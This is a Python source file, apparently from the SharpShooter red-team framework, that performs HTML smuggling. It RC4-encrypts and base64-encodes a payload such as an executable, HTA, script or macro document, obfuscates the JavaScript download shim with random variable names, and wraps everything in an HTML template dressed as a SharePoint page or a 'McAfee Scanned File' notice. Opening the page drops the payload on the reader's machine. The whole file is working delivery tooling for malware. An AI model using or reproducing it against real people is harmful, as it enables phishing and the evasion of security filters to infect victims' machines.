#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Original Author: Arno0x0x - https://twitter.com/Arno0x0x
# Please refer to https://raw.githubusercontent.com/Arno0x/EmbedInHTML for original project
#
# Updated for use with SharpShooter by @domchell
#

import os
import base64
import random
import string

# =====================================================================================
# These are the MIME types that will be presented to the user (even if some are fake)

mimeTypeDict = {
    ".doc": "application/msword",
    ".docx": "application/msword",
    ".docm": "application/msword",
    ".xls": "application/vnd.ms-excel",
    ".xlsx": "application/vnd.ms-excel",
    ".xlsm": "application/vnd.ms-excel",
    ".xll": "application/vnd.ms-excel",
    ".slk": "application/vnd.ms-excel",
    ".ppt": "application/vnd.ms-powerpoint",
    ".pps": "application/vnd.ms-powerpoint",
    ".ppsx": "application/vnd.ms-powerpoint",
    ".exe": "application/octet-stream",
    ".js": "application/js",
    ".vbs": "application/x-vbs",
    ".vbe": "application/x-vbs",
    ".jse": "application/js",
    ".wsf": "text/xml",
    ".hta": "application/hta"
}

# ----------------------------------------------------------------


def rand():
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))

# ------------------------------------------------------------------------


def convertFromTemplate(parameters, templateFile):
    try:
        with open(templateFile) as f:
            src = string.Template(f.read())
            result = src.substitute(parameters)
            f.close()
            return result
    except IOError:
        print("\033[1;31m[!]\033[0;0m Could not open or read template file [{}]".format(templateFile))
        return None

# =====================================================================================
# Class providing RC4 encryption functions
# =====================================================================================


class RC4:
    def __init__(self, key=None):
        self.state = range(256)  # initialisation de la table de permutation
        self.x = self.y = 0  # les index x et y, au lieu de i et j

        if key is not None:
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    # Encrypt binary input data
    def binaryEncrypt(self, data):
        output = [None] * len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = chr((data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF]))
        return ''.join(output)

    # Encrypt string input data
    def stringEncrypt(self, data):
        """
        Decrypt/encrypt the passed data using RC4 and the given key.
        https://github.com/EmpireProject/Empire/blob/73358262acc8ed3c34ffc87fa593655295b81434/data/agent/stagers/dropbox.py
        """
        S, j, out = range(256), 0, []
        for i in range(256):
            j = (j + S[i] + ord(self.key[i % len(self.key)])) % 256
            S[i], S[j] = S[j], S[i]
        i = j = 0
        for char in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
        return ''.join(out)

# =====================================================================================
#                                   MAIN FUNCTION
# =====================================================================================


def run_embedInHtml(key, fileName, outFileName, template_name):

    if key and fileName and outFileName:
        try:
            with open(fileName) as fileHandle:
                fileBytes = bytearray(fileHandle.read())
                fileHandle.close()
                print("\033[1;34m[*]\033[0;0m File [{}] successfully loaded !".format(fileName))
        except IOError:
            print("\033[93m[!]\033[0;0m Could not open or read file [{}]".format(fileName))
            quit()

        # ------------------------------------------------------------------------
        # Create the RC4 encryption object

        rc4Encryptor = RC4(key)
        mimeType = "application/js"
        fileExtension = os.path.splitext(fileName)[1]
        try:
            mimeType = mimeTypeDict[fileExtension]
        except KeyError:
            print("\033[93m[!]\033[0;0m Could not determine the mime type for the input file. Force it using the -m switch.")
            quit()

        payload = base64.b64encode(rc4Encryptor.binaryEncrypt(fileBytes))
        print("\033[1;34m[*]\033[0;0m Encrypted input file with key [{}]".format(key))

        # blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
        blobShim = '(function(b,fname){if(window.navigator.msSaveOrOpenBlob)'
        blobShim += 'window.navigator.msSaveOrOpenBlob(b,fname);else{var a=window.document.createElement("a");'
        blobShim += 'a.href=window.URL.createObjectURL(b, {type:"' + mimeType + '"});a.download=fname;'
        blobShim += 'document.body.appendChild(a);a.click();document.body.removeChild(a);}})'

        # ------------------------------------------------------------------------
        # Preparing all parameters for substitution in the HTML template

        rc4Function = rand()
        b64AndRC4Function = rand()
        keyFunction = rand()
        varPayload = rand()
        varBlobObjectName = rand()
        varBlob = rand()
        varBlobShim = rand()
        blobShimEncrypted = base64.b64encode(rc4Encryptor.stringEncrypt(blobShim))
        blobObjectNameEncrypted = base64.b64encode(rc4Encryptor.stringEncrypt("Blob"))
        fileName = os.path.basename(fileName)

        params = {
            "rc4Function": rc4Function, "b64AndRC4Function": b64AndRC4Function, "keyFunction": keyFunction, "key": key,
            "varPayload": varPayload, "payload": payload, "varBlobObjectName": varBlobObjectName,
            "blobObjectNameEncrypted": blobObjectNameEncrypted, "varBlob": varBlob, "mimeType": mimeType,
            "varBlobShim": varBlobShim, "blobShimEncrypted": blobShimEncrypted, "fileName": fileName
        }

        # Formating the HTML template with all parameters
        templatesource = ""

        if not template_name:
            htmltemplate = input("\n\033[1;34m[*]\033[0;0m Use a custom (1) or predefined (2) template?\n")
            while True:
                try:
                    htmltemplate = int(htmltemplate)
                    if (htmltemplate < 1 or htmltemplate > 2):
                                raise Exception
                    break
                except:
                    print("\033[1;31m[!]\033[0;0m Incorrect choice")

            if htmltemplate == 2:
                print("\n\033[92m[1]\033[0;0m Sharepoint")
                print("\033[92m[2]\033[0;0m McAfee Scanned File")
                while True:
                    template_choice = input("\n\033[1;34m[*]\033[0;0m Please select template\n")
                    try:
                        template_choice = int(template_choice)
                        if (template_choice < 1 or template_choice > 6):
                            raise Exception
                        if(template_choice == 1):
                            templatesource = "./templates/sharepoint.tpl"
                        elif(template_choice == 2):
                            templatesource = "./templates/mcafee.tpl"
                        break
                    except:
                        print("\033[1;31m[!]\033[0;0m Incorrect choice")
            else:
                templatesource = input("\033[1;34m[*]\033[0;0m Provide full path to custom template\n")

        else:
            templatesource = "./templates/%s.tpl" % template_name

        resultHTML = convertFromTemplate(params, templatesource)

        if resultHTML is not None:
            # ------------------------------------------------------------------------
            # Write the HTML file

            htmlFile = outFileName
            try:
                with open(htmlFile, 'w') as fileHandle:
                    fileHandle.write(resultHTML)
                    print("\033[1;34m[*]\033[0;0m File [{}] successfully created !".format(htmlFile))
            except IOError:
                print("\033[1;31m[!]\033[0;0m Could not open or write file [{}]".format(htmlFile))
                quit()
